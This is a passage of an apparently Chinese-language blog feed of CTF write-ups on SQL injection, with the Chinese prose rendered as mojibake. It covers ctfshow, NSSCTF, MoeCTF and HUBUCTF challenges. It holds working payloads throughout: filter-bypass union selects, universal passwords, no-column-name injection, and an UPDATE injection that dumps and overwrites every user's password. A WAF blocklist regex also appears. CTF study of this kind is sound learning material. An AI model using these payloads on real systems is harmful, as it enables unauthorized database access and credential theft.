</p><p>å¤§å°å†™ç»•è¿‡</p><p>ä¸‡èƒ½å¯†ç å¯ä»¥ç›´æ¥ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; Union Select 1,password,3 from ctfshow_user --+</span><br></pre></td></tr></table></figure><p>ctfshow{939338e1-d47c-461b-bc76-f4e60435ae80}</p><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤ç©ºæ ¼ è€Œä¸” â€“+ï¼Œ#åº”è¯¥ä¹Ÿè¿‡æ»¤äº†</p><p>&#x2F;**&#x2F; %23</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,group_concat(password),3/**/from/**/ctfshow_user%23</span><br></pre></td></tr></table></figure><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>ä¾æ—§å¯è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure><p>å¢åŠ äº†<code>/**/</code>çš„è¿‡æ»¤</p><p>å¯ä»¥è¿™äº›ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å›è½¦(%0a) `(tabé”®ä¸Šé¢çš„æŒ‰é’®)(%09) tab å’Œ  %0b %0c %0d %a0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%0aunion%0aselect%0a1,password,3%0afrom%0actfshow_user%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%09union%09select%091,password,3%09from%09ctfshow_user%23</span><br></pre></td></tr></table></figure><p>ctfshow{a2e33152-7f53-4000-b89b-972b5fc739a2}</p><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0cå¯ä»¥ç”¨</span><br><span class="line">1&#x27;union%0cselect%0c1,password,3%0cfrom%0cctfshow_user%23</span><br></pre></td></tr></table></figure><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>è¿˜æ˜¯è¿‡æ»¤ç©ºæ ¼ åªä¸è¿‡è¿™æ¬¡åŠ äº†å¯¹ <code>#</code>(<code>%23</code>) çš„è¿‡æ»¤</p><p>ä¸‡èƒ½å¯†ç ä¾æ—§èƒ½æ‰“</p><p>åªä¸è¿‡éœ€è¦</p><p>è¿™é‡Œä½¿ç”¨ <code>--</code>(â€“ååŠ ä¸ªç©ºæ ¼) ç»•è¿‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1--%0c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union%0cselect%0c1,password,3%0cfrom%0cctfshow_user--%0c</span><br></pre></td></tr></table></figure><p>ctfshow{94f1ba08-b230-4dda-9a6a-eeaac94caef2}</p><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>ç»§ç»­é€ </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1--%0c</span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sqlåˆ·é¢˜ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF</title>
      <link href="/2024/08/06/NSSCTF-sql/"/>
      <url>/2024/08/06/NSSCTF-sql/</url>
      
        <content type="html"><![CDATA[<h1 id="HNCTF-2022-WEEK2-easy-sql"><a href="#HNCTF-2022-WEEK2-easy-sql" class="headerlink" title="[HNCTF 2022 WEEK2]easy_sql"></a>[HNCTF 2022 WEEK2]easy_sql</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/Jayjay___/article/details/132956781">https://blog.csdn.net/Jayjay___/article/details/132956781</a></p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p>è¿™é¢˜è€ƒå¯Ÿäº†æ— åˆ—åæ³¨å…¥</p><p>æˆ‘ä»¬å¸¸ç”¨çš„<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQLæ³¨å…¥</a>æ–¹æ³•æ˜¯é€šè¿‡<code>information_schema</code>è¿™ä¸ªé»˜è®¤æ•°æ®åº“æ¥å®ç°ï¼Œå¯æ˜¯ä½ æœ‰æ²¡æœ‰æƒ³è¿‡ï¼Œå¦‚æœè¿‡æ»¤äº†è¯¥æ•°æ®åº“é‚£ä¹ˆæˆ‘ä»¬å°±ä¸èƒ½é€šè¿‡è¿™ä¸ªåº“æ¥æŸ¥å‡ºè¡¨åå’Œåˆ—åã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹æ³•æ¥æŸ¥å‡ºè¡¨åï¼š</p><p><strong>InnoDbå¼•æ“</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä»MYSQL5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MYSQL5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œinndbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼ˆmysql.innodb_table_statsï¼‰ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚é«˜ç‰ˆæœ¬çš„ mysql ä¸­ï¼Œè¿˜æœ‰ INNODB_TABLES åŠ INNODB_COLUMNS ä¸­è®°å½•ç€è¡¨ç»“æ„ã€‚</span><br></pre></td></tr></table></figure><p><strong>sysæ•°æ®åº“</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨5.7ä»¥ä¸Šçš„MYSQLä¸­ï¼Œæ–°å¢äº†sysæ•°æ®åº“ï¼Œè¯¥åº“çš„åŸºç¡€æ•°æ®æ¥è‡ªinformation_schemaå’Œperformance_chemaï¼Œå…¶æœ¬èº«ä¸å­˜å‚¨æ•°æ®ã€‚å¯ä»¥é€šè¿‡å…¶ä¸­çš„schema_auto_increment_columnsï¼ˆsys.schema_auto_increment_columnsï¼‰æ¥è·å–è¡¨åã€‚</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸Šè¿°ä¸¤ç§æ–¹æ³•éƒ½åªèƒ½æŸ¥å‡ºè¡¨åï¼Œ<strong>æ— æ³•æŸ¥åˆ°åˆ—å</strong>ï¼Œè¿™æ—¶æˆ‘ä»¬å°±è¦ç”¨åˆ°æ— åˆ—åæ³¨å…¥äº†ã€‚æ— åˆ—åæ³¨å…¥ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¸éœ€è¦åˆ—åå°±èƒ½æ³¨å‡ºæ•°æ®çš„æ³¨å…¥ã€‚</p><p><strong>æ— åˆ—åæ³¨å…¥ä½¿ç”¨æ¡ä»¶</strong></p><p>æ— åˆ—åæ³¨å…¥ä¸»è¦æ˜¯é€‚ç”¨äºå·²ç»è·å–åˆ°æ•°æ®è¡¨ï¼Œä½†æ— æ³•æŸ¥è¯¢åˆ—çš„æƒ…å†µä¸‹ï¼Œåœ¨å¤§å¤šæ•° CTF é¢˜ç›®ä¸­ï¼Œ<strong>information_schema åº“è¢«è¿‡æ»¤</strong>ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•è·å–åˆ—åã€‚</p><p><strong>æ— åˆ—åæ³¨å…¥åŸç†</strong></p><p>æ— åˆ—åæ³¨å…¥çš„åŸç†å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯è”åˆæŸ¥è¯¢<strong>åˆ›å»ºè™šæ‹Ÿæ•°æ®</strong>ã€‚<strong>å¯ä»¥çœ‹ä½œå°†æˆ‘ä»¬ä¸çŸ¥é“çš„åˆ—åè¿›è¡Œå–åˆ«åæ“ä½œ</strong>ï¼Œåœ¨å–åˆ«åçš„åŒæ—¶è¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œæ‰€ä»¥æŸ¥è¯¢å­—æ®µæ•°ä¸€å®šè¦ç›¸åŒï¼Œå¦‚æœæˆ‘ä»¬æŸ¥è¯¢çš„å­—æ®µå¤šäºæ•°æ®è¡¨ä¸­åˆ—çš„æ—¶å€™ï¼Œå°±ä¼šå‡ºç°æŠ¥é”™ã€‚</p><h2 id="æœ¬åœ°æ¼”ç¤º"><a href="#æœ¬åœ°æ¼”ç¤º" class="headerlink" title="æœ¬åœ°æ¼”ç¤º"></a>æœ¬åœ°æ¼”ç¤º</h2><p>æ­£å¸¸æŸ¥è¡¨</p><p> select * from Gu0f3n;<br><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B903%E5%88%86.png" alt="image-20240806200233160"></p><p>è”åˆæŸ¥è¯¢è¡¨ä¸­æ•°æ®</p><p>select 1,2,3 union select * from Gu0f3n;(æˆ‘è¿™é‡Œå­—æ®µæ˜¯ä¸‰ï¼Œå…·ä½“æƒ…å†µå…·ä½“åˆ†æ)</p><p>å¾ˆæ˜æ˜¾åˆ›å»ºäº†è™šæ‹Ÿæ•°æ®ï¼ˆè™šæ‹Ÿå­—æ®µå€¼123å’Œè™šæ‹Ÿè¡¨ï¼‰ï¼Œè™šæ‹Ÿè¡¨ä¸­åˆ—åå˜æˆäº†123ã€‚</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B904%E5%88%86.png" alt="image-20240806200442297"></p><p>å¾ˆæ˜æ˜¾åˆ›å»ºäº†è™šæ‹Ÿæ•°æ®ï¼ˆè™šæ‹Ÿå­—æ®µå€¼123å’Œè™šæ‹Ÿè¡¨ï¼‰ï¼Œè™šæ‹Ÿè¡¨ä¸­åˆ—åå˜æˆäº†123ã€‚</p><p>åªæŸ¥ä¸€åˆ—çš„å­—æ®µçš„å€¼æˆ‘ä»¬å¯ä»¥ yyyæ˜¯è‡ªå·±å‘½åçš„è™šæ‹Ÿè¡¨è¡¨åï¼Œå¯ä»¥è‡ªå®šä¹‰è¿™æ¡sqlè¯­å¥åœ¨è”åˆæŸ¥è¯¢åˆ›å»ºè™šæ‹Ÿè¡¨xxxï¼Œè™šæ‹Ÿåˆ—1,2,3çš„åŒæ—¶æŸ¥è¯¢è™šæ‹Ÿè¡¨ç¬¬äºŒåˆ—çš„æ•°æ®ã€‚</p><p>select <code>2</code> from (select 1,2,3 union select * from Gu0f3n)yyy;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B909%E5%88%86.png" alt="image-20240806200938012"></p><p>è¦æŸ¥å¤šä¸ªåˆ—çš„è¯</p><p>select <code>2</code> ,<code>3</code>from (select 1,2,3 union select * from Gu0f3n)yyy;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240806201127902"></p><p>å¦‚æœæœ‰æ—¶å€™æŠŠ&#96;è¿‡æ»¤äº†æˆ‘ä»¬å¯ä»¥ç”¨as</p><p>select 1 as a,2 as b, 3 as c union select * from Gu0f3n;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B914%E5%88%86.png" alt="image-20240806201353981"></p><p>select b from (select 1 as a,2 as b,3 as c union select * from Gu0f3n)yyy;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B915%E5%88%86.png" alt="image-20240806201450310"></p><h2 id="å›åˆ°é¢˜ç›®"><a href="#å›åˆ°é¢˜ç›®" class="headerlink" title="å›åˆ°é¢˜ç›®"></a>å›åˆ°é¢˜ç›®</h2><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240806201644950"></p><p>é»‘åå•åº”è¯¥æ˜¯è¿™æ ·çš„<code>&quot;/and|sleep|extractvalue|information|is|not|updataxml|order|rand|handler|flag|sleep|\~|\!|\@|\#|\\$|\%|\^|\+|\&amp;|\-|\ /i&quot;</code></p><p>åˆ¤æ–­ç±»å‹</p><p>å› ä¸ºæ³¨é‡Šç¬¦å·éƒ½è¿‡æ»¤äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;|&#x27;1</span><br></pre></td></tr></table></figure><p>å‘ç°å›æ˜¾å’Œid&#x3D;1ä¸€æ ·ç¡®å®šæ˜¯å­—ç¬¦å‹</p><p>ç©ºæ ¼&#x2F;**&#x2F;ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;/**/group/**/by/**/3,&#x27;1</span><br></pre></td></tr></table></figure><p>å‘ç°å­—æ®µä¸º3</p><p>åˆ¤æ–­å›æ˜¾ä½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,3/**/where&#x27;1</span><br></pre></td></tr></table></figure><p>è¿™é‡Œwhereæ˜¯é™åˆ¶æ¡ä»¶ ç›®çš„è¿˜æ˜¯æ³¨é‡Šæ‰é—­åˆ</p><p>å‘ç°å›æ˜¾ä½ç½®ä¸º3</p><p>çˆ†åº“å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where&#x27;1</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¿™äº›åº“å</p><p>ctf,ctftraining,ctftraining,ctftraining,mysql</p><p>çˆ†è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where&#x27;1</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¿™äº›è¡¨å</p><p>ccctttfff,flag,news,users,gtid_slave_pos</p><p>ä¸Šé¢è¯´è¿‡ ä¸èƒ½å¾—åˆ°åˆ—å æˆ‘ä»¬ç›´æ¥çˆ†å€¼</p><p>è¿˜å¾—è‡ªå·±ä¸€ä¸ªä¸ªè¯•</p><p>æœ€ç»ˆflag åœ¨ctftraining.flagä¸‹é¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,`6`/**/from/**/(select/**/6/**/union/**/select/**/*/**/from/**/ctftraining.flag)Gu0f3n/**/where&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A521%E7%82%B907%E5%88%86.png" alt="image-20240806210746263"></p><p>è¿˜æœ‰æœ‰ä¸€ç§é—­åˆæ–¹å¼%00</p><p>å…¶ä»–éƒ½ä¸€æ ·</p><h1 id="MoeCTF-2022-Sqlmap-boy"><a href="#MoeCTF-2022-Sqlmap-boy" class="headerlink" title="[MoeCTF 2022]Sqlmap_boy"></a>[MoeCTF 2022]Sqlmap_boy</h1><p>ä¸‡èƒ½å¯†ç æˆåŠŸè¿›å…¥</p><p>adminâ€ or 1&#x3D;1#</p><p>å‘ç°æ³¨å…¥ç‚¹ id é—­åˆæ–¹å¼ä¸ºå•å¼•å·å­—æ®µä¸º3</p><p>å›æ˜¾ä¸ºä¸º 2ï¼Œ3</p><p>å½“å‰åº“åä¸ºmoectf</p><p>çˆ†è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p>articles,flag,users</p><p>çˆ†åˆ—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=database()--+</span><br></pre></td></tr></table></figure><p>flAg</p><p>çˆ†å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27; union select 1,group_concat(flAg),3 from flag--+</span><br></pre></td></tr></table></figure><p>NSSCTF{75b86f27-423b-418f-ac60-08815140a910}</p><h1 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-ezsql"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-ezsql" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]ezsql"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]ezsql</h1><p>è¿™é¢˜æç¤ºè·å¾—adminçš„å¯†ç </p><h2 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_35599248/article/details/122440184">https://blog.csdn.net/qq_35599248/article/details/122440184</a></p><p>æˆ‘ä»¬å¸¸è§çš„<a href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">sqlæ³¨å…¥</a>ä¸€èˆ¬éƒ½æ˜¯åŸºäºselectè¯­å¥ï¼Œä½†æ˜¯åœ¨updateï¼Œinsertï¼Œdeleteä¹Ÿå¯ä»¥æ³¨å…¥ã€‚</p><p>ä»–ä»¬çš„åŸç†éƒ½æ˜¯å½“æ‰§è¡Œæ—¶é‡åˆ° (è¡¨è¾¾å¼1)(and&#x2F;or)(è¡¨è¾¾å¼2) ï¼Œè¿™ç§å½¢å¼çš„å¼å­æ—¶ï¼Œå‰åè¡¨è¾¾å¼å‰åéƒ½ä¼šæ‰§è¡Œï¼Œç„¶ååšé€»è¾‘è¿ç®—ï¼Œæœ€åçš„ç»“æœè¦ä¹ˆ0ï¼Œè¦ä¹ˆ1ã€‚</p><p>å‡å¦‚æˆ‘ä»¬sqlæ³¨å…¥çš„payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; AND 3666=3666 AND â€²Gu0f3n&#x27;=&#x27;Gu0f3n</span><br></pre></td></tr></table></figure><p>SQLæŸ¥è¯¢ä¼šå˜æˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; AND 3666=3666 AND &#x27;Gu0f3n&#x27;=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure><ol><li><strong>id&#x3D;â€™1â€™</strong>:<ul><li>è¿™ä¸ªéƒ¨åˆ†å°† <code>id</code> è®¾ä¸º <code>1</code>ï¼Œå¹¶é—­åˆäº†å¼•å·ã€‚æ­¤æ—¶ï¼Œ<code>id</code> çš„å€¼å®é™…ä¸Šä¸º <code>&#39;1&#39;</code>ã€‚</li></ul></li><li><strong>AND 3666&#x3D;3666</strong>:<ul><li>è¿™æ˜¯ä¸€ä¸ªæ’çœŸæ¡ä»¶ï¼Œå› ä¸º3666æ€»æ˜¯ç­‰äº3666ã€‚è¿™ä¸ªæ¡ä»¶ä¿è¯äº†æ³¨å…¥éƒ¨åˆ†çš„åˆæ³•æ€§ï¼Œå¹¶ä¸”åœ¨é€»è¾‘ä¸Šä¸æ”¹å˜æŸ¥è¯¢çš„ç»“æœã€‚</li></ul></li><li><strong>AND â€˜Gu0f3nâ€™&#x3D;â€™Gu0f3nâ€™</strong>:<ul><li>è¿™æ˜¯å¦ä¸€ä¸ªæ’çœŸæ¡ä»¶ï¼Œå› ä¸º<code>Gu0f3n</code>æ€»æ˜¯ç­‰äº<code>Gu0f3n</code>ã€‚è¿™è¿›ä¸€æ­¥ç¡®ä¿äº†æŸ¥è¯¢çš„åˆæ³•æ€§ã€‚</li></ul></li></ol><h3 id="ä¸­é—´æ’å…¥è¡¨è¾¾å¼çš„ä½"><a href="#ä¸­é—´æ’å…¥è¡¨è¾¾å¼çš„ä½" class="headerlink" title="ä¸­é—´æ’å…¥è¡¨è¾¾å¼çš„ä½"></a>ä¸­é—´æ’å…¥è¡¨è¾¾å¼çš„ä½</h3><p>è¿™ç§æ³¨å…¥æ–¹æ³•çš„å…³é”®åœ¨äºå¼•å…¥ä¸¤ä¸ªæ’çœŸæ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢è¯­å¥åœ¨é€»è¾‘ä¸Šå§‹ç»ˆä¸ºçœŸã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸­é—´çš„è¡¨è¾¾å¼ä½æ’å…¥ä»»æ„çš„SQLè¯­å¥ï¼Œè€Œä¸ä¼šå¼•èµ·è¯­æ³•é”™è¯¯æˆ–é€»è¾‘é”™è¯¯ã€‚</p><h3 id="å…·ä½“ä¾‹å­"><a href="#å…·ä½“ä¾‹å­" class="headerlink" title="å…·ä½“ä¾‹å­"></a>å…·ä½“ä¾‹å­</h3><p>å‡è®¾æˆ‘ä»¬å¸Œæœ›é€šè¿‡SQLæ³¨å…¥æ¥æŸ¥è¯¢æ•°æ®åº“çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ„é€ å¦‚ä¸‹çš„payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; AND 3362=3362 AND (SELECT version())=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæŸ¥è¯¢ä¼šå˜æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; AND 3362=3362 AND (SELECT version())=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ¥è¯´ä¸€ä¸‹<a href="https://so.csdn.net/so/search?q=insert&spm=1001.2101.3001.7020">insert</a>ï¼Œupdateï¼Œdeleteçš„æ³¨å…¥ã€‚</p><h3 id="insertæ³¨å…¥"><a href="#insertæ³¨å…¥" class="headerlink" title="insertæ³¨å…¥"></a>insertæ³¨å…¥</h3><p>insertè¯­å¥çš„æ ¼å¼ä¸€èˆ¬ä¸º<br>insert into <teable_name> values (,,,â€¦);<br>å½“æˆ‘ä»¬å‘ç°åé¢æ’å…¥å€¼çš„<strong>æŸä¸ªä½ç½®æˆ‘ä»¬å¯æ§</strong>æ—¶ï¼Œå°±å¯ä»¥æŠŠé‚£ä¸ªä½ç½®æ”¹æˆå¤šä¸ªé€»è¾‘è¿æ¥è¯çš„å½¢å¼ï¼ŒåŒæ—¶insertæ³¨å…¥è¿˜å¯ä»¥å¸®åŠ©æˆ‘ä»¬ä»»æ„æ³¨å†Œè´¦å·ã€‚å› ä¸ºæ’å…¥è¯­å¥è¦æ±‚æˆ‘ä»¬æ’å…¥ä½ç½®çš„æ•°æ®ç±»å‹ç›¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æˆ‘ä»¬å¯æ§çš„ä½ç½®çš„æ•°æ®ç±»å‹ä¸€èˆ¬éƒ½æ˜¯æ•°å€¼.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into Gu0f3n values(1 and if(1&gt;2,0,sleep(3)),&#x27;shell&#x27;,&#x27;Gu0f3n&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A509%E7%82%B950%E5%88%86.png" alt="image-20240807094926093"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into Gu0f3n values(1 and updatexml(1,(select concat(0x7e,version())),3),&#x27;shell&#x27;,&#x27;Gu0f3n&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A509%E7%82%B956%E5%88%86.png" alt="image-20240807095633287"></p><h3 id="updateæ³¨å…¥"><a href="#updateæ³¨å…¥" class="headerlink" title="updateæ³¨å…¥"></a>updateæ³¨å…¥</h3><p>æ ¼å¼</p><p>update <table_name> set column &#x3D; where &lt;æ¡ä»¶&gt;</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A510%E7%82%B912%E5%88%86.png" alt="image-20240807101214936"></p><h3 id="deleteæ³¨å…¥"><a href="#deleteæ³¨å…¥" class="headerlink" title="deleteæ³¨å…¥"></a>deleteæ³¨å…¥</h3><p>delete from <table_name> where &lt;æ¡ä»¶&gt;<br>åŸç†è¿˜æ˜¯å’Œä¸Šé¢ä¸€æ ·ï¼Œåªæ˜¯è¿™ä¸ªè¦æ³¨æ„ä¸€ä¸‹ä¸è¦æŠŠæ•°æ®åº“é‡Œé¢çš„å†…å®¹åˆ äº†ï¼Œæ‰€ä»¥ä¸€å®šè¦ä¿æŒæœ€åé€»è¾‘è¡¨è¾¾å¼çš„ç»“æœä¸ºå‡ã€‚orè¿æ¥è¯æ…ç”¨ã€‚</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A510%E7%82%B914%E5%88%86.png" alt="image-20240807101426609"></p><h3 id="å›åˆ°é¢˜ç›®-1"><a href="#å›åˆ°é¢˜ç›®-1" class="headerlink" title="å›åˆ°é¢˜ç›®"></a>å›åˆ°é¢˜ç›®</h3><p>adminå¼±å£ä»¤çˆ†ç ´ä¸å‡º</p><p>ä¸‡èƒ½å¯†ç æ²¡è¯•å‡ºæ¥</p><p>æ‰«ç›®å½•å‘ç°æºç æ³„éœ²</p><p>å‘ç°update.php</p><p>å­˜åœ¨sqlæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query<span class="operator">=</span>$mysqli<span class="operator">-</span><span class="operator">&gt;</span>query(&quot;update users set age=$_POST[age],nickname=&#x27;$_POST[nickname]&#x27;,description=&#x27;$_POST[description]&#x27; where id=$_SESSION[id]&quot;);</span><br></pre></td></tr></table></figure><p>æ³¨å…¥ç‚¹åœ¨ageè¿™é‡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3n&amp;age=-1,description=(select database())#&amp;description=ss&amp;token=294e68dc4639816cda6dea96ca92603d</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºåº“å</p><p>demo2</p><p>çˆ†è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure><p>users</p><p>çˆ†åˆ—</p><p>å‘ç°è¿™é‡Œå°†å•å¼•å·è¿‡æ»¤äº† </p><p>å°†usersè½¬16è¿›åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=database())#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure><p>id,username,password,nickname,age,description</p><p>å¾—åˆ°è¿™äº›åˆ—</p><p>çœ‹åˆ°å¯†ç æ‹¿å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(password) users)#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure><p>MD5å­˜å‚¨</p><p>3691308f2a4c2f6983f2880d32e29c84</p><p>æ›´æ–°æ‰€æœ‰å¯†ç (aaa)</p><p>nickname&#x3D;Gu0f3b&amp;age&#x3D;11,password&#x3D;0x3437626365356337346635383966343836376462643537653963613966383038#&amp;description&#x3D;sss&amp;token&#x3D;3ac68ca374a43cc099684f4353f5284d</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A511%E7%82%B957%E5%88%86.png" alt="image-20240807115708531"></p><p>ç»™äº†æ®µmd5</p><p>è§£å¯†å‘ç°æ˜¯iamcool</p><p>é‡å¯é¶æœº</p><p>ç™»å½•admin&#x2F;iamcool</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A511%E7%82%B959%E5%88%86.png" alt="image-20240807115943261"></p><h1 id="NSSCTF-2022-Spring-Recruit-babysql"><a href="#NSSCTF-2022-Spring-Recruit-babysql" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babysql"></a>[NSSCTF 2022 Spring 